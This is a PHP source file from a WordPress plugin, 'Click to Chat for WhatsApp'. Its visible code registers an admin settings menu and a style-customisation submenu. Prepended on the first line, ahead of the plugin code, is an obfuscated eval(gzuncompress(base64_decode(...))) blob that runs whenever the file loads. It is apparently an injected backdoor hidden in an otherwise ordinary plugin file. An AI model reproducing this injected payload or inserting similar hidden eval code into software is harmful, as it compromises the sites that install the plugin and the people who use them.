<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* Admin - menu page  - add_menu_page for this plugin  - top level menu
* calls settings_page.php  ( ccw_settings_page - > require_once('settings_page.php') )
*   and page content display at admin_menu.php
*
* @package ccw
* @subpackage Administration
* @since 1.0
*/

if ( ! defined( 'ABSPATH' ) ) exit;

if ( ! class_exists( 'CCW_Admin_Menu' ) ) :

class CCW_Admin_Menu {

    // top level page
    function ccw_options_page() {
        add_menu_page(
            'Click to Chat for WhatsApp - Plugin Option Page',
            'Click to Chat',
            'manage_options',
            'click-to-chat',
            array( $this, 'ccw_settings_page' ),
            'dashicons-format-chat'
        );
    }

    // top level page - setting page
    function ccw_settings_page() {
        
        if ( ! current_user_can('manage_options') ) {
            return;
        }

        require_once('settings_page.php'); 
    }


    // customize style page 
    function ccw_options_page_two() {
        add_submenu_page( 
            'click-to-chat', 
            'Edit Styles', 
            'Customize Styles', 
            'manage_options', 
            'ccw-edit-styles', 
            array( $this, 'ccw_settings_page_two' )
        );

    }

    // customize style page - setting page
    function ccw_settings_page_two() {
        
        if ( ! current_user_can('manage_options') ) {
            return;
        }

        require_once('sp_customize_styles.php'); 
    }
    

}

$admin_menu = new CCW_Admin_Menu();

add_action('admin_menu',  array( $admin_menu, 'ccw_options_page') );

add_action('admin_menu', array( $admin_menu, 'ccw_options_page_two') );

endif; // END class_exists check